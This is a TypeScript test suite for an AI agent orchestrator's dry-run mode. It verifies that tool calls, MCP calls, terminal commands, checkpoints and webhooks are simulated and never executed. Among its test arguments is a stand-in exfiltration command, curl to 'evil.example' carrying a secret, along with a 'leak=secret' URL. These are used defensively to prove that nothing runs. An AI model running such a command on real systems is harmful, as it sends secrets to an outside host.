import { readFileSync, readdirSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import { Orchestrator } from '../../src/core/orchestrator.ts';
import { AgentRegistry } from '../../src/core/agentRegistry.ts';
import { SkillsRegistry } from '../../src/core/skillsRegistry.ts';
import { ModelRouter } from '../../src/core/modelRouter.ts';
import { MemoryManager } from '../../src/memory/memoryManager.ts';
import { CostTracker } from '../../src/core/costTracker.ts';
import { ProviderRegistry } from '../../src/providers/index.ts';
import { TaskProfiler } from '../../src/core/taskProfiler.ts';
import { classifyToolInvocation } from '../../src/core/toolPolicy.ts';
import { getBuiltinWorkspaceTools } from '../../src/core/builtinWorkspaceTools.ts';
import { createBuiltinSkills, createDiscoverResourcesSkill } from '../../src/skills/index.ts';
import { emptyTurnProvenance } from '../../src/core/contextProvenance.ts';
import { QUARANTINE_EXTRACTION_RULES } from '../../src/core/quarantinedReader.ts';
import {
  DRY_RUN_BUILTIN_TABLE,
  DRY_RUN_CONTEXT_METHODS,
  type DryRunRecord,
} from '../../src/core/dryRun.ts';
import type {
  AgentDefinition,
  OrchestratorHooks,
  SkillDefinition,
  SkillExecutionContext,
  ToolApprovalGateMeta,
  ToolRiskCategory,
  TurnProvenance,
} from '../../src/types.ts';
import type { CompletionRequest, CompletionResponse, ProviderAdapter, ToolCall } from '../../src/providers/adapter.ts';

/**
 * The guarantee dry run makes, proved against a real Orchestrator: with
 * `atlasmind.dryRun.enabled` on, walking every built-in skill — plus an MCP
 * tool, a workspace-scanned skill and a name nothing registered — invokes no
 * effect method on the skill context, no MCP `callTool`, no approval gate for a
 * simulated call, no checkpoint, no verifier and no webhook. Only the built-ins
 * the table grades as local reads run, and none of them reaches the backstop.
 */

const ROOT = path.resolve(__dirname, '..', '..');

type Gate = (taskId: string, toolName: string, args: Record<string, unknown>, meta?: ToolApprovalGateMeta) => Promise<{ approved: boolean; reason?: string }>;

const EFFECT_METHODS = Object.entries(DRY_RUN_CONTEXT_METHODS)
  .filter(([, kind]) => kind === 'effect')
  .map(([member]) => member);

function defaultFor(member: string): unknown {
  switch (member) {
    case 'readFile':
    case 'getGitStatus':
    case 'getGitDiff':
    case 'getGitLog':
    case 'getTerminalOutput':
    case 'getAtlasMindOutputLog':
    case 'gitBranch':
    case 'evaluateDebugExpression':
    case 'runAgent':
      return Promise.resolve('');
    case 'getActiveDebugSession':
      return Promise.resolve(null);
    case 'getSpecialistApiKey':
      return Promise.resolve('test-key');
    case 'runCommand':
      return Promise.resolve({ ok: true, exitCode: 0, stdout: '', stderr: '' });
    case 'fetchUrl':
    case 'httpRequest':
      return Promise.resolve({ ok: true, status: 200, body: 'body' });
    case 'applyGitPatch':
      return Promise.resolve({ ok: true, stdout: '', stderr: '' });
    case 'upsertMemory':
      return { status: 'created' };
    case 'deleteMemory':
      return Promise.resolve(true);
    case 'renameSymbol':
      return Promise.resolve({ filesChanged: 1, editsApplied: 1 });
    case 'applyCodeAction':
      return Promise.resolve({ applied: true });
    case 'rollbackLastCheckpoint':
    case 'rollbackCheckpointByTaskId':
      return Promise.resolve({ ok: true, summary: 'restored', restoredPaths: [] });
    case 'launchDebugSession':
      return Promise.resolve({ ok: true, message: 'started' });
    case 'addBreakpoint':
      return Promise.resolve('bp-1');
    case 'removeBreakpoints':
      return Promise.resolve({ removed: 1 });
    case 'testResourceBudget':
      return undefined;
    default:
      return Promise.resolve([]);
  }
}

/** A context with every member the interface declares, each one a spy. */
function makeSkillContext(): { context: SkillExecutionContext; calls: string[] } {
  const calls: string[] = [];
  const context: Record<string, unknown> = { workspaceRootPath: '/workspace' };
  for (const member of Object.keys(DRY_RUN_CONTEXT_METHODS)) {
    if (member === 'workspaceRootPath') {
      continue;
    }
    context[member] = vi.fn(() => {
      calls.push(member);
      return member === 'withResolutionRoot' ? context : defaultFor(member);
    });
  }
  return { context: context as unknown as SkillExecutionContext, calls };
}

/** Records every call made on any property, so an untouched client stays empty. */
function spyObject(): { object: unknown; calls: string[] } {
  const calls: string[] = [];
  const object = new Proxy({}, {
    get: (_target, property) => (...args: unknown[]) => {
      calls.push(`${String(property)}(${args.length})`);
      return Promise.resolve([]);
    },
  });
  return { object, calls };
}

function toolRound(...calls: Array<{ name: string; arguments: Record<string, unknown> }>): CompletionResponse {
  return {
    content: '',
    model: 'local/echo-1',
    inputTokens: 10,
    outputTokens: 5,
    finishReason: 'tool_calls',
    toolCalls: calls.map((call, index): ToolCall => ({ id: `call-${index}-${call.name}`, ...call })),
  };
}

const DONE: CompletionResponse = { content: 'Planned.', model: 'local/echo-1', inputTokens: 10, outputTokens: 5, finishReason: 'stop' };

function makeProvider(responses: CompletionResponse[]) {
  let call = 0;
  const requests: CompletionRequest[] = [];
  const provider: ProviderAdapter = {
    providerId: 'local',
    complete: vi.fn((request: CompletionRequest) => {
      requests.push(structuredClone({ ...request, signal: undefined }));
      if (request.messages[0]?.content === QUARANTINE_EXTRACTION_RULES) {
        return Promise.resolve({ ...DONE, content: '{"facts":[],"urls":[]}' });
      }
      return Promise.resolve(responses[call++] ?? responses.at(-1)!);
    }),
    listModels: vi.fn().mockResolvedValue(['local/echo-1']),
    healthCheck: vi.fn().mockResolvedValue(true),
  };
  return { provider, requests };
}

interface Harness {
  orchestrator: Orchestrator;
  registry: SkillsRegistry;
  contextCalls: string[];
  gate: ReturnType<typeof vi.fn<Gate>>;
  checkpoint: ReturnType<typeof vi.fn>;
  verifier: ReturnType<typeof vi.fn>;
  webhook: { emit: ReturnType<typeof vi.fn> };
  records: DryRunRecord[];
  settings: Map<string, unknown>;
  requests: CompletionRequest[];
  context: SkillExecutionContext;
}

function makeHarness(
  skills: SkillDefinition[],
  responses: CompletionResponse[],
  options: { settings?: Record<string, unknown>; hooks?: Partial<OrchestratorHooks> } = {},
): Harness {
  const router = new ModelRouter();
  router.registerProvider({
    id: 'local',
    displayName: 'Local',
    apiKeySettingKey: '',
    pricingModel: 'free',
    enabled: true,
    models: [{
      id: 'local/echo-1',
      provider: 'local',
      name: 'Local Echo',
      contextWindow: 64_000,
      inputPricePer1k: 0.0005,
      outputPricePer1k: 0.0005,
      capabilities: ['chat', 'code', 'function_calling'],
      enabled: true,
    }],
  });
  const { provider, requests } = makeProvider(responses);
  const providers = new ProviderRegistry();
  providers.register(provider);
  const registry = new SkillsRegistry();
  for (const entry of skills) {
    registry.register(entry);
  }
  const { context, calls } = makeSkillContext();
  const settings = new Map<string, unknown>(Object.entries({
    'dryRun.enabled': true,
    toolApprovalMode: 'ask-on-write',
    skillAutoSynthesisEnabled: true,
    ...options.settings,
  }));
  const gate = vi.fn<Gate>().mockResolvedValue({ approved: true });
  const checkpoint = vi.fn().mockResolvedValue(undefined);
  const verifier = vi.fn().mockResolvedValue('verified');
  const webhook = { emit: vi.fn().mockResolvedValue(undefined) };
  const records: DryRunRecord[] = [];
  const orchestrator = new Orchestrator(
    new AgentRegistry(),
    registry,
    router,
    new MemoryManager(),
    new CostTracker(),
    providers,
    context,
    new TaskProfiler(),
    undefined,
    webhook as never,
    {
      readSetting: <T>(key: string, fallback: T): T => (settings.has(key) ? settings.get(key) as T : fallback),
      toolApprovalGate: gate,
      writeCheckpointHook: checkpoint,
      postToolVerifier: verifier,
      onDryRunRecord: record => records.push(record),
      ...options.hooks,
    } as OrchestratorHooks,
  );
  return { orchestrator, registry, contextCalls: calls, gate, checkpoint, verifier, webhook, records, settings, requests, context };
}

const AGENT = (skills: string[]): AgentDefinition => ({
  id: 'planner',
  name: 'Planner',
  role: 'engineer',
  description: 'Does the work.',
  systemPrompt: 'Do the task.',
  skills,
});

async function run(harness: Harness, skills: string[], id = 'task-dry') {
  return harness.orchestrator.processTaskWithAgent({
    id,
    userMessage: 'Do the task.',
    context: {},
    constraints: { budget: 'balanced', speed: 'balanced' },
    timestamp: new Date().toISOString(),
  }, AGENT(skills));
}

function toolMessages(requests: CompletionRequest[], toolName: string): string[] {
  const found = new Set<string>();
  for (const request of requests) {
    for (const message of request.messages) {
      if (message.role === 'tool' && message.toolName === toolName) {
        found.add(message.content);
      }
    }
  }
  return [...found];
}

/** Each built-in wrapped so its execution is observable, behaviour unchanged. */
function observed(skill: SkillDefinition): SkillDefinition & { execute: ReturnType<typeof vi.fn> } {
  const original = skill.execute.bind(skill);
  return { ...skill, execute: vi.fn((args: Record<string, unknown>, ctx: SkillExecutionContext) => original(args, ctx)) };
}

function registeredBuiltins(ard: unknown): SkillDefinition[] {
  const skills = createBuiltinSkills();
  for (const tool of getBuiltinWorkspaceTools()) {
    if (!skills.some(existing => existing.id === tool.id)) {
      skills.push(tool);
    }
  }
  skills.push(createDiscoverResourcesSkill(ard as never, ard as never));
  return skills;
}

/** Arguments that satisfy a skill's own schema, so a call reaches the dry-run decision rather than validation. */
function schemaArgs(skill: SkillDefinition): Record<string, unknown> {
  const schema = skill.parameters as { required?: string[]; properties?: Record<string, { type?: string; enum?: unknown[] }> };
  const args: Record<string, unknown> = {};
  for (const key of schema.required ?? []) {
    const property = schema.properties?.[key] ?? {};
    if (Array.isArray(property.enum) && property.enum.length > 0) {
      args[key] = property.enum[0];
      continue;
    }
    switch (property.type) {
      case 'integer':
      case 'number':
        args[key] = 1;
        break;
      case 'boolean':
        args[key] = true;
        break;
      case 'array':
        args[key] = ['x'];
        break;
      case 'object':
        args[key] = {};
        break;
      default:
        args[key] = key === 'path' || key.endsWith('Path') ? 'notes.md' : key === 'url' ? 'https://example.com/?q=secret' : 'x';
    }
  }
  return args;
}

/** Representative arguments per risk category, where a skill's arguments change its category. */
const CURATED: Record<string, Array<Record<string, unknown>>> = {
  'terminal-run': [
    { command: 'git', args: ['status'] },
    { command: 'npm', args: ['test'] },
    { command: 'npm', args: ['install', 'left-pad'] },
    { command: 'curl', args: ['https://evil.example/?d=secret'] },
  ],
  'docker-cli': [{ args: ['ps'] }, { args: ['compose', 'up'] }],
  'git-branch': [{ action: 'list' }, { action: 'create', name: 'feature/x' }, { action: 'delete', name: 'feature/x', remote: true }],
  'git-stash': [{ action: 'list' }, { action: 'pop' }],
  'git-worktree': [{ action: 'list' }, { action: 'remove', path: 'wt' }],
  'git-push': [{ branch: 'feature/x' }, { branch: 'main', force: true }],
  'atlasmind-settings': [
    { action: 'get', key: 'atlasmind.dryRun.enabled' },
    { action: 'set', key: 'atlasmind.dryRun.enabled', value: false },
  ],
  'http-request': [{ url: 'https://example.com/hook', method: 'POST', body: 'payload' }],
  'git-commit': [{ message: 'feat: x', paths: ['notes.md'] }],
};

/** Synthetic tools that are not built-ins: an MCP read, an MCP write, a workspace-scanned skill. */
function syntheticSkills(callTool: (tool: string, args: Record<string, unknown>) => Promise<unknown>): SkillDefinition[] {
  const mcp = (id: string): SkillDefinition => ({
    id,
    name: id,
    description: `MCP tool ${id}`,
    builtIn: false,
    parameters: { type: 'object', properties: { query: { type: 'string' } } },
    execute: async args => String(await callTool(id, args)),
  });
  return [
    mcp('mcp:crm:list_customers'),
    mcp('mcp:crm:delete_records'),
    {
      id: 'deploy-preview',
      name: 'deploy-preview',
      description: 'A workspace-scanned skill.',
      builtIn: false,
      source: '/workspace/.atlasmind/skills/deploy-preview.js',
      parameters: { type: 'object', properties: {} },
      execute: async (_args, ctx) => {
        await ctx.runCommand('npx', ['deploy']);
        return 'deployed';
      },
    },
  ];
}

function expectedToExecute(toolName: string, args: Record<string, unknown>): boolean {
  const row = (DRY_RUN_BUILTIN_TABLE as Record<string, { class: string } | undefined>)[toolName];
  if (!row) {
    return false;
  }
  if (row.class === 'local-read') {
    return true;
  }
  return row.class === 'args' && args['action'] === 'get';
}

describe('the dry-run table is exhaustive over the built-in skills', () => {
  it('has exactly one row per registered built-in skill', () => {
    const ard = spyObject();
    const ids = registeredBuiltins(ard.object).map(skill => skill.id).sort();
    expect(new Set(ids).size).toBe(ids.length);
    expect(Object.keys(DRY_RUN_BUILTIN_TABLE).sort()).toEqual(ids);
  });

  it('knows every skill factory src/skills/index.ts exports outside createBuiltinSkills', () => {
    // A built-in registered through a factory (because it needs injected
    // clients) is registered by the extension, not by createBuiltinSkills, so
    // the list above adds it by hand. A new factory fails here until it is added.
    const index = readFileSync(path.join(ROOT, 'src', 'skills', 'index.ts'), 'utf8');
    const factories = [...index.matchAll(/export \{ (create\w+Skill) \}/g)].map(match => match[1]);
    expect(factories).toEqual(['createDiscoverResourcesSkill']);
  });

  it('grades as local-read only skills whose every context call is a read', () => {
    // Static half of the backstop: a skill module that reaches an effect method
    // cannot be tabled `local-read`, whatever its arguments are.
    const dir = path.join(ROOT, 'src', 'skills');
    for (const file of readdirSync(dir).filter(name => name.endsWith('.ts') && name !== 'index.ts')) {
      const source = readFileSync(path.join(dir, file), 'utf8');
      // A file can declare two skills (gitBranch.ts holds git-log and
      // git-branch), so each id owns the source up to the next one — which is
      // where its own execute() is.
      const declarations = [...source.matchAll(/^ {2}id: '([\w-]+)'/gm)];
      for (const [index, declaration] of declarations.entries()) {
        const id = declaration[1]!;
        const row = (DRY_RUN_BUILTIN_TABLE as Record<string, { class: string } | undefined>)[id];
        if (row?.class !== 'local-read') {
          continue;
        }
        const segment = source.slice(declaration.index, declarations[index + 1]?.index ?? source.length);
        const members = [...new Set([...segment.matchAll(/\b(?:context|ctx)\??\.(\w+)/g)].map(match => match[1]!))];
        expect(members.length + (id === 'specialist-guidance' ? 1 : 0), `${id} reaches the context`).toBeGreaterThan(0);
        const effects = members.filter(member => (DRY_RUN_CONTEXT_METHODS as Record<string, string>)[member] !== 'read');
        expect(effects, `${id} (${file})`).toEqual([]);
      }
    }
  });
});

describe('walking every tool with dry run on', () => {
  const ard = spyObject();
  const callTool = vi.fn().mockResolvedValue('remote result');
  const cases: Array<{ toolName: string; args: Record<string, unknown> }> = [];
  for (const skill of [...registeredBuiltins(ard.object), ...syntheticSkills(callTool)]) {
    for (const args of CURATED[skill.id] ?? [schemaArgs(skill)]) {
      cases.push({ toolName: skill.id, args });
    }
  }
  cases.push({ toolName: 'nothing-registered-this', args: { anything: 1 } });

  it('covers every risk category a tool can be classified into', () => {
    const covered = new Set(cases.map(entry => classifyToolInvocation(entry.toolName, entry.args).category));
    // `audio-input` / `audio-output` belong to the voice surfaces; no tool
    // classifies there, so there is nothing to walk.
    const expected: ToolRiskCategory[] = ['read', 'git-read', 'workspace-write', 'git-write', 'terminal-read', 'terminal-write', 'network', 'network-read'];
    for (const category of expected) {
      expect(covered.has(category), category).toBe(true);
    }
  });

  it.each(cases.map(entry => [entry.toolName, JSON.stringify(entry.args), entry] as const))(
    '%s %s acts on nothing',
    async (_name, _args, { toolName, args }) => {
      const ardSpy = spyObject();
      const remote = vi.fn().mockResolvedValue('remote result');
      const skills = [...registeredBuiltins(ardSpy.object), ...syntheticSkills(remote)].map(observed);
      const harness = makeHarness(skills, [toolRound({ name: toolName, arguments: args }), DONE]);

      const result = await run(harness, [toolName]);

      // The world: no effect method, no MCP call, no Resource Discovery call.
      expect(harness.contextCalls.filter(member => EFFECT_METHODS.includes(member))).toEqual([]);
      expect(remote).not.toHaveBeenCalled();
      expect(ardSpy.calls).toEqual([]);
      // The machinery around an action: none of it.
      expect(harness.checkpoint).not.toHaveBeenCalled();
      expect(harness.verifier).not.toHaveBeenCalled();
      expect(harness.webhook.emit).not.toHaveBeenCalled();
      expect(harness.records.some(record => record.rule === 'dry-run.backstop')).toBe(false);

      const executed = skills.find(skill => skill.id === toolName)?.execute.mock.calls.length ?? 0;
      if (expectedToExecute(toolName, args)) {
        expect(executed).toBe(1);
        expect(harness.records).toEqual([]);
      } else {
        expect(executed).toBe(0);
        expect(harness.gate).not.toHaveBeenCalled();
        expect(harness.records.map(record => record.toolName)).toEqual([toolName]);
        expect(toolMessages(harness.requests, toolName)[0]).toMatch(/^\[DRY RUN — nothing was executed\]/);
        expect(result.response).toContain('**Dry run — nothing was executed.** 1 action simulated');
      }
      // A name nothing registered stays unregistered: no skill was synthesised to find out.
      expect(harness.registry.get('nothing-registered-this')).toBeUndefined();
    },
  );
});

function writeSkill(onExecute: () => void = () => undefined): SkillDefinition & { execute: ReturnType<typeof vi.fn> } {
  return {
    id: 'file-write',
    name: 'file-write',
    description: 'Write a file.',
    builtIn: true,
    parameters: { type: 'object', properties: { path: { type: 'string' }, content: { type: 'string' } } },
    execute: vi.fn(async () => { onExecute(); return 'Wrote notes.md'; }),
  };
}

describe('sticky for the turn', () => {
  it('turning dry run on mid-turn applies to the very next call', async () => {
    let harness: Harness | undefined;
    const write = writeSkill(() => harness!.settings.set('dryRun.enabled', true));
    harness = makeHarness([write], [
      toolRound({ name: 'file-write', arguments: { path: 'a.md', content: 'x' } }),
      toolRound({ name: 'file-write', arguments: { path: 'b.md', content: 'y' } }),
      DONE,
    ], { settings: { 'dryRun.enabled': false } });

    const result = await run(harness, ['file-write']);

    expect(write.execute).toHaveBeenCalledTimes(1);
    expect(harness.records.map(record => record.toolName)).toEqual(['file-write']);
    expect(result.response).toContain('**Dry run — nothing was executed.**');
  });

  it('turning it off mid-turn waits for the next turn', async () => {
    const write = writeSkill();
    const harness = makeHarness([write], [
      toolRound({ name: 'file-write', arguments: { path: 'a.md', content: 'x' } }),
      toolRound({ name: 'file-write', arguments: { path: 'b.md', content: 'y' } }),
      DONE,
      toolRound({ name: 'file-write', arguments: { path: 'c.md', content: 'z' } }),
      DONE,
    ], { hooks: { onDryRunRecord: () => harness.settings.set('dryRun.enabled', false) } });

    await run(harness, ['file-write'], 'turn-1');
    expect(write.execute).not.toHaveBeenCalled();

    const next = await run(harness, ['file-write'], 'turn-2');
    expect(write.execute).toHaveBeenCalledTimes(1);
    expect(next.response).not.toContain('Dry run');
  });

  it('reads an unreadable setting as on', async () => {
    const write = writeSkill();
    const harness = makeHarness([write], [toolRound({ name: 'file-write', arguments: { path: 'a.md', content: 'x' } }), DONE], {
      settings: { 'dryRun.enabled': 'yes please' },
    });
    await run(harness, ['file-write']);
    expect(write.execute).not.toHaveBeenCalled();
  });
});

describe('a simulated call never happened', () => {
  it('absorbs no provenance, asks nobody and quarantines nothing, even for a network read', async () => {
    const fetch = observed(createBuiltinSkills().find(skill => skill.id === 'web-fetch')!);
    const write = writeSkill();
    const harness = makeHarness([fetch, write], [
      toolRound({ name: 'web-fetch', arguments: { url: 'https://example.com/?leak=secret' } }),
      toolRound({ name: 'file-write', arguments: { path: 'notes.md', content: 'x' } }),
      DONE,
    ]);
    const provenanceCell: { current: TurnProvenance } = { current: emptyTurnProvenance() };

    await harness.orchestrator.processTaskWithAgent({
      id: 'task-taint',
      userMessage: 'Fetch the notes and write them down.',
      context: { __provenanceCell: provenanceCell },
      constraints: { budget: 'balanced', speed: 'balanced' },
      timestamp: new Date().toISOString(),
    }, AGENT(['web-fetch', 'file-write']));

    expect(fetch.execute).not.toHaveBeenCalled();
    expect(provenanceCell.current.level).not.toBe('third-party');
    expect(harness.gate).not.toHaveBeenCalled();
    expect(harness.requests.some(request => request.messages[0]?.content === QUARANTINE_EXTRACTION_RULES)).toBe(false);
    // The write is simulated as an ordinary one: nothing tainted the turn.
    const writeMessage = toolMessages(harness.requests, 'file-write')[0] ?? '';
    expect(writeMessage).not.toContain('untrusted content');
    expect(writeMessage).toContain('Would have asked for approval: yes');
  });

  it('says what the taint gate would have decided, without asking', async () => {
    const write = writeSkill();
    const harness = makeHarness([write], [toolRound({ name: 'file-write', arguments: { path: 'notes.md', content: 'x' } }), DONE]);
    const tainted = {
      ...emptyTurnProvenance(),
      level: 'third-party' as const,
      sources: [{ origin: 'tool-result' as const, toolName: 'web-fetch', provenance: 'third-party' as const, rule: 'provenance.network-skill', injectionSuspected: false }],
    };

    await harness.orchestrator.processTaskWithAgent({
      id: 'task-tainted',
      userMessage: 'Write the notes.',
      context: { __provenanceCell: { current: tainted } },
      constraints: { budget: 'balanced', speed: 'balanced' },
      timestamp: new Date().toISOString(),
    }, AGENT(['file-write']));

    expect(harness.gate).not.toHaveBeenCalled();
    expect(toolMessages(harness.requests, 'file-write')[0]).toContain('a fresh approval, because this task has read untrusted content');
  });

  it('runs find-tool against the turn\'s own pool but never searches Resource Discovery', async () => {
    const harness = makeHarness([writeSkill()], [toolRound({ name: 'find-tool', arguments: { query: 'deploy to kubernetes' } }), DONE]);
    const search = vi.fn().mockResolvedValue({ status: 'found', resources: [] });
    harness.orchestrator.setExternalCapabilitySearch(search);

    await run(harness, ['file-write']);

    expect(search).not.toHaveBeenCalled();
    expect(toolMessages(harness.requests, 'find-tool')[0]).toContain('[DRY RUN] Resource Discovery was not searched');
  });
});

describe('what dry run switches off', () => {
  it('does not hand a dry turn to an ACP agent\'s own tools', async () => {
    const acpProvider: ProviderAdapter = {
      providerId: 'acp',
      complete: vi.fn().mockResolvedValue({ ...DONE, model: 'acp/claude@opus' }),
      listModels: vi.fn().mockResolvedValue(['acp/claude@opus']),
      healthCheck: vi.fn().mockResolvedValue(true),
    };
    const router = new ModelRouter();
    router.registerProvider({
      id: 'acp',
      displayName: 'ACP',
      apiKeySettingKey: '',
      pricingModel: 'subscription',
      enabled: true,
      models: [{
        id: 'acp/claude@opus',
        provider: 'acp',
        name: 'Claude via ACP',
        contextWindow: 200_000,
        inputPricePer1k: 0,
        outputPricePer1k: 0,
        capabilities: ['chat', 'code', 'reasoning'],
        enabled: true,
        delegatedToolExecution: true,
      }],
    });
    const providers = new ProviderRegistry();
    providers.register(acpProvider);
    const registry = new SkillsRegistry();
    registry.register(writeSkill());
    const { context } = makeSkillContext();
    const orchestrator = new Orchestrator(
      new AgentRegistry(), registry, router, new MemoryManager(), new CostTracker(), providers,
      context, new TaskProfiler(), undefined, undefined,
      {
        readSetting: <T>(key: string, fallback: T): T =>
          (key === 'acp.toolsEnabled' || key === 'dryRun.enabled' ? true as T : fallback),
      } as OrchestratorHooks,
    );

    await orchestrator.processTaskWithAgent({
      id: 'task-acp-dry',
      userMessage: 'Update notes.md.',
      context: {},
      constraints: { budget: 'balanced', speed: 'balanced', preferredProvider: 'acp' },
      timestamp: new Date().toISOString(),
    }, { ...AGENT(['file-write']), allowedModels: ['acp/claude@opus'] });

    const delegated = (acpProvider.complete as ReturnType<typeof vi.fn>).mock.calls
      .some(([request]) => (request as CompletionRequest).allowDelegatedToolExecution === true);
    expect(delegated).toBe(false);
  });

  async function projectRunGitCalls(dryRun: boolean): Promise<number> {
    const write = writeSkill();
    const harness = makeHarness([write], [DONE], {
      settings: { 'dryRun.enabled': dryRun, 'execution.worktreeIsolation': true },
      hooks: { runGit: vi.fn().mockResolvedValue('') },
    });
    const runGit = (harness as unknown as { orchestrator: { runGitHook: ReturnType<typeof vi.fn> } }).orchestrator.runGitHook;
    const result = await harness.orchestrator.processProject('Write two notes', { budget: 'balanced', speed: 'balanced' }, undefined, {
      planOverride: {
        id: `plan-${dryRun ? 'dry' : 'live'}`,
        goal: 'Write two notes',
        subTasks: [
          { id: 'one', title: 'One', description: 'Write one.md.', role: 'writer', skills: ['file-write'], dependsOn: [] },
          { id: 'two', title: 'Two', description: 'Write two.md.', role: 'writer', skills: ['file-write'], dependsOn: [] },
        ],
      },
    });
    if (dryRun) {
      expect(result.synthesis).toContain('**Dry run — nothing was executed.**');
    }
    return runGit.mock.calls.length;
  }

  it('makes no worktrees for a dry project run', async () => {
    // The control proves the setup would have isolated the writers.
    expect(await projectRunGitCalls(false)).toBeGreaterThan(0);
    expect(await projectRunGitCalls(true)).toBe(0);
  });
});
